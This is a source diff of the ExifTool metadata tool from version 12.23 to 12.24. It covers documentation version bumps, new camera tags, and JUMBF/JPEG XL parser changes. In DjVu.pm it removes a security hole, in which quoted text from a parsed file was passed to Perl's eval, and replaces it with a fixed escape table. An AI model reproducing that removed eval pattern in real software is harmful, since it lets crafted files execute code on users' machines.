diff -u -r -N exiftool-12.23/html/exiftool_pod.html exiftool-12.24/html/exiftool_pod.html
--- exiftool-12.23/html/exiftool_pod.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/exiftool_pod.html	2021-04-13 15:11:46.000000000 +0000
@@ -685,7 +685,7 @@
 
 <p>produces output like this:</p>
 
-<pre><code>    -- Generated by ExifTool 12.23 --
+<pre><code>    -- Generated by ExifTool 12.24 --
     File: a.jpg - 2003:10:31 15:44:19
     (f/5.6, 1/60s, ISO 100)
     File: b.jpg - 2006:05:23 11:57:38

diff -u -r -N exiftool-12.23/html/exiftool_pod.pdf exiftool-12.24/html/exiftool_pod.pdf
--- exiftool-12.23/html/exiftool_pod.pdf	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/exiftool_pod.pdf	2021-04-13 15:11:46.000000000 +0000
@@ -12,7 +12,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     1)Tj
+(                              -- ExifTool 12.24 --                                     1)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (EXIFTOOL\(1\)           User Contributed Perl Documentation          EXIFTOOL\(1\))Tj
@@ -637,7 +637,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     2)Tj
+(                              -- ExifTool 12.24 --                                     2)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (         AVIF  r/w   | FITS  r     | MAX   r     | PDB   r     | THM   r/w)Tj
@@ -834,7 +834,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     3)Tj
+(                              -- ExifTool 12.24 --                                     3)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (         -charset [[TYPE=]CHARSET]        Specify encoding for special characters)Tj
@@ -991,7 +991,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     4)Tj
+(                              -- ExifTool 12.24 --                                     4)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (         -globalTimeShift SHIFT           Shift all formatted date/time values)Tj
@@ -1282,7 +1282,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     5)Tj
+(                              -- ExifTool 12.24 --                                     5)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            the -)Tj
@@ -1615,7 +1615,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     6)Tj
+(                              -- ExifTool 12.24 --                                     6)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            deletable Time tags except those in the EXIF.  This difference)Tj
@@ -2052,7 +2052,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     7)Tj
+(                              -- ExifTool 12.24 --                                     7)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            specified for each copied tag.  With this feature, information may)Tj
@@ -2539,7 +2539,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     8)Tj
+(                              -- ExifTool 12.24 --                                     8)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            groups of tags from a file containing redundant information, it)Tj
@@ -3042,7 +3042,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                     9)Tj
+(                              -- ExifTool 12.24 --                                     9)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            "unsafe".  For instance, the FileName and Directory tags are)Tj
@@ -3463,7 +3463,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    10)Tj
+(                              -- ExifTool 12.24 --                                    10)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (                Vietnam     cp1258           Windows Vietnamese)Tj
@@ -3748,7 +3748,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    11)Tj
+(                              -- ExifTool 12.24 --                                    11)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            names, the duplicate tags are only included in the CSV output if)Tj
@@ -4221,7 +4221,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    12)Tj
+(                              -- ExifTool 12.24 --                                    12)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            option, a dash \("-"\) is printed for the value of any missing tag,)Tj
@@ -4838,7 +4838,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    13)Tj
+(                              -- ExifTool 12.24 --                                    13)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            UTF-8 regardless of any -)Tj
@@ -5227,7 +5227,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    14)Tj
+(                              -- ExifTool 12.24 --                                    14)Tj
 /TT4 1 Tf
 0 -2.7333 TD
 (                push @INC, 'lib';)Tj
@@ -5492,7 +5492,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    15)Tj
+(                              -- ExifTool 12.24 --                                    15)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            A section is defined as a group of consecutive files with the same)Tj
@@ -5525,7 +5525,7 @@
 T*
 (            produces output like this:)Tj
 T*
-(                -- Generated by ExifTool 12.23 --)Tj
+(                -- Generated by ExifTool 12.24 --)Tj
 0 -1.1 TD
 (                File: a.jpg - 2003:10:31 15:44:19)Tj
 T*
@@ -5871,7 +5871,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    16)Tj
+(                              -- ExifTool 12.24 --                                    16)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            to column-align values.)Tj
@@ -6414,7 +6414,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    17)Tj
+(                              -- ExifTool 12.24 --                                    17)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            the source file extension \(including the '.'\) with the specified)Tj
@@ -6645,7 +6645,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    18)Tj
+(                              -- ExifTool 12.24 --                                    18)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            For %d and %D, the field width/position specifiers may be applied)Tj
@@ -6876,7 +6876,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    19)Tj
+(                              -- ExifTool 12.24 --                                    19)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            the output file \(based on the format of the data\).  The %g code)Tj
@@ -7383,7 +7383,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    20)Tj
+(                              -- ExifTool 12.24 --                                    20)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       -)Tj
@@ -7884,7 +7884,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    21)Tj
+(                              -- ExifTool 12.24 --                                    21)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            that exiftool will automatically fix the offsets for images which)Tj
@@ -8441,7 +8441,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    22)Tj
+(                              -- ExifTool 12.24 --                                    22)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            character to disable print conversion.  The expression $GROUP:all)Tj
@@ -8756,7 +8756,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    23)Tj
+(                              -- ExifTool 12.24 --                                    23)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            with minor errors and disables some validation checks which could)Tj
@@ -9311,7 +9311,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    24)Tj
+(                              -- ExifTool 12.24 --                                    24)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            necessary.)Tj
@@ -9886,7 +9886,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    25)Tj
+(                              -- ExifTool 12.24 --                                    25)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            to tags with numerical tag ID's, and causes tag names like)Tj
@@ -10267,7 +10267,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    26)Tj
+(                              -- ExifTool 12.24 --                                    26)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            used to prevent the command window from closing when run as a)Tj
@@ -10872,7 +10872,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    27)Tj
+(                              -- ExifTool 12.24 --                                    27)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            they are supported by the destination metadata format\):)Tj
@@ -11239,7 +11239,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    28)Tj
+(                              -- ExifTool 12.24 --                                    28)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       -)Tj
@@ -11906,7 +11906,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    29)Tj
+(                              -- ExifTool 12.24 --                                    29)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            -)Tj
@@ -12539,7 +12539,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    30)Tj
+(                              -- ExifTool 12.24 --                                    30)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            per line \(see the -)Tj
@@ -13096,7 +13096,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    31)Tj
+(                              -- ExifTool 12.24 --                                    31)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       with spaces translated to underlines, and multiple consecutive)Tj
@@ -13295,7 +13295,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    32)Tj
+(                              -- ExifTool 12.24 --                                    32)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       valid ExifTool character set, preferably "UTF8" \(see the -)Tj
@@ -13804,7 +13804,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    33)Tj
+(                              -- ExifTool 12.24 --                                    33)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       quotes as below around arguments containing special characters.)Tj
@@ -13941,7 +13941,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    34)Tj
+(                              -- ExifTool 12.24 --                                    34)Tj
 /TT4 1 Tf
 0 -2.7333 TD
 (       exiftool -icc_profile -b -w icc image.jpg)Tj
@@ -14108,7 +14108,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    35)Tj
+(                              -- ExifTool 12.24 --                                    35)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       exiftool -r -XMP-crss:all= DIR)Tj
@@ -14275,7 +14275,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    36)Tj
+(                              -- ExifTool 12.24 --                                    36)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            Copy the values of all writable tags from "src.cr2" to "dst.jpg",)Tj
@@ -14444,7 +14444,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    37)Tj
+(                              -- ExifTool 12.24 --                                    37)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (            Recursively rewrite all "JPG" images in "dir" with information)Tj
@@ -14691,7 +14691,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    38)Tj
+(                              -- ExifTool 12.24 --                                    38)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       exiftool -o . '-Directory<DateTimeOriginal' -d %Y/%m/%d dir)Tj
@@ -14868,7 +14868,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                              -- ExifTool 12.23 --                                    39)Tj
+(                              -- ExifTool 12.24 --                                    39)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       exiftool -xmp:geotag=track.log a.jpg)Tj
@@ -15243,7 +15243,7 @@
 0.6 0 TD
 (s\(3pm\), Image::ExifTool::Shift.pl)Tj
 -19.2 -4.4 TD
-(perl v5.18.4                      2021-04-01                       EXIFTOOL\(1\))Tj
+(perl v5.18.4                      2021-04-13                       EXIFTOOL\(1\))Tj
 ET
 endstream
 endobj
@@ -15703,8 +15703,8 @@
 endobj
 130 0 obj
 <<
-/CreationDate (D:20210401142148-04'00')
-/ModDate (D:20210401142148-04'00')
+/CreationDate (D:20210413110921-04'00')
+/ModDate (D:20210413110921-04'00')
 /Producer (Apple pstopdf)
 >>
 endobj
@@ -15854,7 +15854,7 @@
 /Size 132
 /Root 131 0 R
 /Info 130 0 R
-/ID [<ab798910bbf7ddf1029ca400262164d7><ab798910bbf7ddf1029ca400262164d7>]
+/ID [<88f6ccfb20ef49d8fb5d8a90914f5aa9><88f6ccfb20ef49d8fb5d8a90914f5aa9>]
 >>
 startxref
 267700

diff -u -r -N exiftool-12.23/html/history.html exiftool-12.24/html/history.html
--- exiftool-12.23/html/history.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/history.html	2021-04-13 15:11:46.000000000 +0000
@@ -17,6 +17,18 @@
 <!-- Use line width of 80 -->
 <!-- *********************************************************************** -->
 
+<a name='v12.24'><b>Apr. 13, 2021 - Version 12.24</b></a>
+<ul>
+<li>Added a new PhaseOne RawFormat value (thanks LibRaw)
+<li>Decode a new Sony tag (thanks Jos Roost)
+<li>Decode a few new Panasonic and FujiFilm tags (thanks LibRaw and Greybeard)
+<li>Patched security vulnerability in DjVu reader
+<li>Updated acdsee.config in distribution (thanks StarGeek)
+<li>Recognize AutoCAD DXF files
+<li>More work on experimental JUMBF read support
+<li>More work on experimental JXL read/write support
+</ul>
+
 <a name='v12.23'><b>Apr. 1, 2021 - Version 12.23</b></a>
 <ul>
 <li>Added support for Olympus ORI files
@@ -34,7 +46,7 @@
 <li>Fixed -forcewrite=EXIF to apply to EXIF in binary header of EPS files
 <li>API Changes:
     <ul>
-    <li>Added BlockExtract option
+    <li>Added <a href="ExifTool.html#BlockExtract">BlockExtract option</a>
     </ul>
 </ul>

diff -u -r -N exiftool-12.23/html/index.html exiftool-12.24/html/index.html
--- exiftool-12.23/html/index.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/index.html	2021-04-13 15:11:46.000000000 +0000
@@ -81,9 +81,9 @@
 </div>
 
 <blockquote><table class='dl lg'><tr><td><b>
-<a href="http://sourceforge.net/projects/exiftool/files/Image-ExifTool-12.23.tar.gz/download">
-Download        Version 12.23</a> (4.7 MB) -
-<a href="history.html">Apr. 1, 2021</a></b></td></tr></table></blockquote>
+<a href="http://sourceforge.net/projects/exiftool/files/Image-ExifTool-12.24.tar.gz/download">
+Download        Version 12.24</a> (4.7 MB) -
+<a href="history.html">Apr. 13, 2021</a></b></td></tr></table></blockquote>
 
 <p><b>ExifTool is a platform-independent <a href="ExifTool.html">Perl
 library</a> plus a <a href="exiftool_pod.html">command-line application</a> for
@@ -136,8 +136,8 @@
 
 <blockquote><table class='dl lg'><tr><td><b>
 <a name="alone">Windows Executable:</a>
-<a href="http://sourceforge.net/projects/exiftool/files/exiftool-12.23.zip/download">
-         exiftool-12.23.zip</a> (6.4 MB)</b></td></tr></table></blockquote>
+<a href="http://sourceforge.net/projects/exiftool/files/exiftool-12.24.zip/download">
+         exiftool-12.24.zip</a> (6.4 MB)</b></td></tr></table></blockquote>
 
 <p><b>The stand-alone Windows executable</b> does not require Perl. Just
 download and un-zip the archive then double-click on
@@ -155,7 +155,7 @@
 <blockquote><table class='dl lg'><tr><td><b>
 MacOS Package:
 <a href="http://sourceforge.net/projects/exiftool/files/ExifTool-9.70.dmg/download">
-         ExifTool-12.23.dmg</a> (3.0 MB)</b></td></tr></table></blockquote>
+         ExifTool-12.24.dmg</a> (3.0 MB)</b></td></tr></table></blockquote>
 
 <p><b>The MacOS package</b> installs the ExifTool command-line application and
 libraries in /usr/local/bin. After installing, type "<code>exiftool</code>" in a

diff -u -r -N exiftool-12.23/html/install.html exiftool-12.24/html/install.html
--- exiftool-12.23/html/install.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/install.html	2021-04-13 15:11:46.000000000 +0000
@@ -52,10 +52,10 @@
 <h3>Stand-Alone Executable</h3>
 <ol>
 <li><b>Download</b> the <b>Windows Executable</b> from the <a href="index.html">ExifTool home page</a>.
-<br><span class=lt>(The file you download should be named "<code>exiftool-12.23.zip</code>".)</span></li>
+<br><span class=lt>(The file you download should be named "<code>exiftool-12.24.zip</code>".)</span></li>
 <li><b>Extract "<code>exiftool(-k).exe</code>"</b> from the
 "<code>.zip</code>" file, and place it <b>on your Desktop</b>.
-<br><span class=lt>(Double-click on "<code>exiftool-12.23.zip</code>" to open
+<br><span class=lt>(Double-click on "<code>exiftool-12.24.zip</code>" to open
 the archive, then drag "<code>exiftool(-k).exe</code>" to your Desktop.)</span></li>
 </ol>
 <p>You can now double-click on "<code>exiftool(-k).exe</code>" to read the
@@ -109,7 +109,7 @@
 <a href="http://www.activestate.com/activeperl/">activeperl.com</a>.)</p>
 <ol>
 <li><b>Download</b> the <b>Image-ExifTool distribution</b> from the <a href="index.html">ExifTool home page</a>
-<br><span class=lt>(The file you download should be named "<code>Image-ExifTool-12.23.tar.gz</code>".)</span></li>
+<br><span class=lt>(The file you download should be named "<code>Image-ExifTool-12.24.tar.gz</code>".)</span></li>
 <li><b>Extract the ExifTool files</b> from the archive.
 <br><span class=lt>(The archive is a gzipped tar file, and can be opened with
 various Windows utilities, including WinZip.)</span></li>
@@ -151,7 +151,7 @@
 <h3>MacOS Package</h3>
 <ol>
 <li><b>Download</b> the <b>ExifTool MacOS Package</b> from the <a href="index.html">ExifTool home page</a>.
-<br><span class=lt>(The file you download should be named "<code>ExifTool-12.23.dmg</code>".)</span></li>
+<br><span class=lt>(The file you download should be named "<code>ExifTool-12.24.dmg</code>".)</span></li>
 <li><b>Install</b> as a normal <b>MacOS package</b>.
 <br><span class=lt>(Open the disk image, double-click on the install package, and follow the instructions.
 See the second item in the Notes section below if you are stopped with an "unidentified developer" message.)
@@ -167,12 +167,12 @@
 <ol>
 <li><b>Download</b> the <b>Image-ExifTool distribution</b> from the <a href="index.html">ExifTool home page</a>
 to your Desktop.
-<br><span class=lt>(The file you download should be named "<code>Image-ExifTool-12.23.tar.gz</code>".)</span></li>
+<br><span class=lt>(The file you download should be named "<code>Image-ExifTool-12.24.tar.gz</code>".)</span></li>
 <li><b>Launch</b> the <b>Terminal</b> application from the Utilities folder in your Applications folder.</li>
 <li>In the Terminal window, <b>type the following</b>:
 <pre class='code'>    cd ~/Desktop
-    tar -xzf Image-ExifTool-12.23.tar.gz
-    cd Image-ExifTool-12.23
+    tar -xzf Image-ExifTool-12.24.tar.gz
+    cd Image-ExifTool-12.24
     sudo cp -r exiftool lib /usr/local/bin
 </pre>
 <span class=lt>(Note: The last step above will require you to enter your
@@ -188,7 +188,7 @@
 precedence for exiftool, but /Library/Perl/#.#.# is the default for any other
 Perl scripts.</li>
 <li>In MacOS 10.8 or later, you may see this message when you try to open the install package:
-<blockquote class=red>"ExifTool-12.23.pkg" can't be opened because it is from an
+<blockquote class=red>"ExifTool-12.24.pkg" can't be opened because it is from an
 unidentified developer.</blockquote> The solution is to control-click on the pkg
 then select "Open" from the pop-up menu instead of just double-clicking.  An alternative
 is to lower the security settings by changing "Allow applications downloaded from" to
@@ -215,11 +215,11 @@
 
 <ol>
 <li><b>Download</b> the <b>Image-ExifTool distribution</b> from the <a href="index.html">ExifTool home page</a>
-<br><span class=lt>(The file you download should be named "<code>Image-ExifTool-12.23.tar.gz</code>".)</span></li>
+<br><span class=lt>(The file you download should be named "<code>Image-ExifTool-12.24.tar.gz</code>".)</span></li>
 <li><b>Unpack the distribution</b> and <b>make it your current directory</b> by typing:
 <pre class='code'>    cd <i>&lt;your download directory&gt;</i>
-    gzip -dc Image-ExifTool-12.23.tar.gz | tar -xf -
-    cd Image-ExifTool-12.23
+    gzip -dc Image-ExifTool-12.24.tar.gz | tar -xf -
+    cd Image-ExifTool-12.24
 </pre>
 <span class=lt>(At this point you may run exiftool by typing
 "<code>./exiftool <i>&lt;image file name&gt;</i></code>".)</span></li>

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/DjVu.pm exiftool-12.24/lib/Image/ExifTool/DjVu.pm
--- exiftool-12.23/lib/Image/ExifTool/DjVu.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/DjVu.pm	2021-04-13 15:11:46.000000000 +0000
@@ -18,7 +18,7 @@
 use vars qw($VERSION);
 use Image::ExifTool qw(:DataAccess :Utils);
 
-$VERSION = '1.06';
+$VERSION = '1.07';
 
 sub ParseAnt($);
 sub ProcessAnt($$$);
@@ -227,10 +227,11 @@
                 last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
                 $tok .= '"';    # quote is part of the string
             }
-            # must protect unescaped "$" and "@" symbols, and "\" at end of string
-            $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
-            # convert C escape sequences (allowed in quoted text)
-            $tok = eval qq{"$tok"};
+            # convert C escape sequences, allowed in quoted text
+            # (note: this only converts a few of them!)
+            my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
+                        r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
+            $tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
         } else {                # key name
             pos($$dataPt) = pos($$dataPt) - 1;
             # allow anything in key but whitespace, braces and double quotes

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/FujiFilm.pm exiftool-12.24/lib/Image/ExifTool/FujiFilm.pm
--- exiftool-12.23/lib/Image/ExifTool/FujiFilm.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/FujiFilm.pm	2021-04-13 15:11:46.000000000 +0000
@@ -31,7 +31,7 @@
 use Image::ExifTool qw(:DataAccess :Utils);
 use Image::ExifTool::Exif;
 
-$VERSION = '1.79';
+$VERSION = '1.80';
 
 sub ProcessFujiDir($$$);
 sub ProcessFaceRec($$$);
@@ -507,6 +507,7 @@
             0 => 'Off',
             1 => 'On',
             2 => 'No flash & flash', #3
+            6 => 'Pixel Shift', #IB (GFX100S)
         },
     }],
     0x1101 => {
@@ -517,6 +518,8 @@
         Name => 'DriveSettings',
         SubDirectory => { TagTable => 'Image::ExifTool::FujiFilm::DriveSettings' },
     },
+    0x1105 => { Name => 'PixelShiftShots',  Writable => 'int16u' }, #IB
+    0x1106 => { Name => 'PixelShiftOffset', Writable => 'rational64s', Count => 2 }, #IB
     # (0x1150-0x1152 exist only for Pro Low-light and Pro Focus PictureModes)
     # 0x1150 - Pro Low-light - val=1; Pro Focus - val=2 (ref 7); HDR - val=128 (forum10799)
     # 0x1151 - Pro Low-light - val=4 (number of pictures taken?); Pro Focus - val=2,3 (ref 7); HDR - val=3 (forum10799)
@@ -915,15 +918,22 @@
     WRITABLE => 1,
     0.1 => {
         Name => 'FocusMode2',
-        Mask => 0x000000ff,
+        Mask => 0x0000000f,
         PrintConv => {
-            0x00 => 'AF-M',
-            0x01 => 'AF-S',
-            0x02 => 'AF-C',
-            0x11 => 'AF-S (Auto)',
+            0x0 => 'AF-M',
+            0x1 => 'AF-S',
+            0x2 => 'AF-C',
         },
     },
     0.2 => {
+        Name => 'PreAF',
+        Mask => 0x00f0,
+        PrintConv => {
+            0 => 'Off',
+            1 => 'On',
+        },
+    },
+    0.3 => {
         Name => 'AFAreaMode',
         Mask => 0x0f00,
         PrintConv => {
@@ -932,7 +942,7 @@
             2 => 'Wide/Tracking',
         },
     },
-    0.3 => {
+    0.4 => {
         Name => 'AFAreaPointSize',
         Mask => 0xf000,
         PrintConv => {
@@ -940,7 +950,7 @@
             OTHER => sub { return $_[0] },
         },
     },
-    0.4 => {
+    0.5 => {
         Name => 'AFAreaZoneSize',
         Mask => 0xf0000,
         PrintConv => {

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/Jpeg2000.pm exiftool-12.24/lib/Image/ExifTool/Jpeg2000.pm
--- exiftool-12.23/lib/Image/ExifTool/Jpeg2000.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/Jpeg2000.pm	2021-04-13 15:11:46.000000000 +0000
@@ -607,8 +607,8 @@
     PROCESS_PROC => \&ProcessJUMD,
     GROUPS => { 0 => 'JUMBF', 1 => 'JUMBF', 2 => 'Image' },
     NOTES => 'Information extracted from the JUMBF description box.',
-    type => {
-        Name => 'JUMBFType',
+    'jumd-type' => {
+        Name => 'JUMDType',
         ValueConv => 'unpack "H*", $val',
         PrintConv => q{
             my @a = $val =~ /^(\w{8})(\w{4})(\w{4})(\w{16})$/;
@@ -621,9 +621,18 @@
         # cacb/cast/caas/cacl/casg/json-00110010800000aa00389b71
         # 6579d6fbdba2446bb2ac1b82feeb89d1 - JPEG image
     },
-    label      => { Name => 'JUMBFLabel' },
-    id         => { Name => 'JUMBFID', Description => 'JUMBF ID' },
-    signature  => { Name => 'JUMBFSignature', PrintConv => 'unpack "H*", $val' },
+    'jumd-label' => { Name => 'JUMDLabel' },
+    'jumd-flags' => {
+        Name => 'JUMDFlags',
+        PrintConv => { BITMASK => {
+            0 => 'Requestable',
+            1 => 'Label',
+            2 => 'ID',
+            3 => 'Signature',
+        }},
+    },
+    'jumd-id'    => { Name => 'JUMDID', Description => 'JUMD ID' },
+    'jumd-sig'   => { Name => 'JUMDSignature', PrintConv => 'unpack "H*", $val' },
 );
 
 #------------------------------------------------------------------------------
@@ -666,15 +675,16 @@
     delete $$et{JUMBFLabel};
     $$dirInfo{DirLen} < 17 and $et->Warn('Truncated JUMD directory'), return 0;
     my $type = substr($$dataPt, $pos, 4);
-    $et->HandleTag($tagTablePtr, 'type', substr($$dataPt, $pos, 16));
+    $et->HandleTag($tagTablePtr, 'jumd-type', substr($$dataPt, $pos, 16));
     $pos += 16;
     my $flags = Get8u($dataPt, $pos++);
+    $et->HandleTag($tagTablePtr, 'jumd-flags', $flags);
     if ($flags & 0x02) {    # label exists?
         pos($$dataPt) = $pos;
         $$dataPt =~ /\0/g or $et->Warn('Missing JUMD label terminator'), return 0;
         my $len = pos($$dataPt) - $pos;
         my $name = substr($$dataPt, $pos, $len);
-        $et->HandleTag($tagTablePtr, 'label', $name);
+        $et->HandleTag($tagTablePtr, 'jumd-label', $name);
         $pos += $len;
         if ($len) {
             $name =~ s/[^-_a-zA-Z0-9]([a-z])/\U$1/g; # capitalize characters after illegal characters
@@ -686,12 +696,12 @@
     }
     if ($flags & 0x04) {    # ID exists?
         $pos + 4 > $end and $et->Warn('Missing JUMD ID'), return 0;
-        $et->HandleTag($tagTablePtr, 'id', Get32u($dataPt, $pos));
+        $et->HandleTag($tagTablePtr, 'jumd-id', Get32u($dataPt, $pos));
         $pos += 4;
     }
     if ($flags & 0x08) {    # signature exists?
         $pos + 32 > $end and $et->Warn('Missing JUMD signature'), return 0;
-        $et->HandleTag($tagTablePtr, 'signature', substr($$dataPt, $pos, 32));
+        $et->HandleTag($tagTablePtr, 'jumd-sig', substr($$dataPt, $pos, 32));
         $pos += 32;
     }
     $pos == $end or $et->Warn('Extra data in JUMD box'." $pos $end", 1);
@@ -1043,6 +1053,7 @@
 #------------------------------------------------------------------------------
 # Extract parameters from JPEG XL codestream [unverified!]
 # Inputs: 0) ExifTool ref, 1) codestream ref
+# Returns: 1
 sub ProcessJXLCodestream($$)
 {
     my ($et, $dataPt) = @_;
@@ -1076,6 +1087,7 @@
     }
     $et->FoundTag(ImageWidth => $x);
     $et->FoundTag(ImageHeight => $y);
+    return 1;
 }
 
 #------------------------------------------------------------------------------
@@ -1094,16 +1106,8 @@
     return 0 unless $raf->Read($hdr,12) == 12;
     unless ($hdr eq "\0\0\0\x0cjP  \x0d\x0a\x87\x0a" or     # (ref 1)
             $hdr eq "\0\0\0\x0cjP\x1a\x1a\x0d\x0a\x87\x0a" or # (ref 2)
-            ($hdr eq "\0\0\0\x0cJXL \x0d\x0a\x87\x0a" and $$et{IsJXL} = 1)) # (JPEG XL)
+            $$et{IsJXL})
     {
-        if ($hdr =~ /^\xff\x0a/) {
-            $outfile and $et->Error('Writing of JPEG XL codestream files is not yet supported'), return 0;
-            # JPEG XL codestream
-            $et->SetFileType('JXC',undef,'JXL'); # (PH invention)
-            $et->Warn('JPEG XL codestream support is currently experimental',1);
-            ProcessJXLCodestream($et, \$hdr);
-            return 1;
-        }
         return 0 unless $hdr =~ /^\xff\x4f\xff\x51\0/;  # check for JP2 codestream format
         if ($outfile) {
             $et->Error('Writing of J2C files is not yet supported');
@@ -1117,7 +1121,6 @@
         $raf->Seek(0,0);
         return $et->ProcessJPEG($dirInfo);    # decode with JPEG processor
     }
-    $et->Warn('JPEG XL support is currently experimental',1) if $$et{IsJXL};
     if ($outfile) {
         Write($outfile, $hdr) or return -1;
         if ($$et{IsJXL}) {
@@ -1154,11 +1157,56 @@
 #------------------------------------------------------------------------------
 # Read meta information from a JPEG XL image
 # Inputs: 0) ExifTool object reference, 1) dirInfo reference
-# Returns: 1 on success, 0 if this wasn't a valid JPEG XL file
+# Returns: 1 on success, 0 if this wasn't a valid JPEG XL file, -1 on write error
 sub ProcessJXL($$)
 {
     my ($et, $dirInfo) = @_;
-    return ProcessJP2($et, $dirInfo);
+    my $raf = $$dirInfo{RAF};
+    my $outfile = $$dirInfo{OutFile};
+    my ($hdr, $buff);
+
